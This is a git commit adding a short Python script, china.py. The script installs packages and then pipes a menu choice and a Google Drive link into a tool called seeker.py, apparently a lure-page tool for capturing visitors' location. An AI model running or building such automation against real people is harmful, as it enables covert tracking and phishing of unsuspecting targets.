18dced090f5eb144612023b10af57cdb4e7eeefe
Victor Mario Bertini <victor.m.bertini@gmail.com>
2022-02-09 23:04:45 -0300

    start

---
+++ china.py
@@ -0,0 +1,11 @@
+import subprocess
+
+subprocess.run('apt -y install python', shell = True)
+
+subprocess.run('apt -y install php', shell = True)
+
+subprocess.run('pip3 install requests', shell = True)
+
+subprocess.run('pip3 install packaging', shell = True)
+
+subprocess.run('printf "1\nhttps://drive.google.com/file/d/1ITGfZ10xfU7zEYRK6tKLgHJrLS7mPJrl/view?usp=sharing" | python3 seeker.py', shell = True, cwd='./seeker')
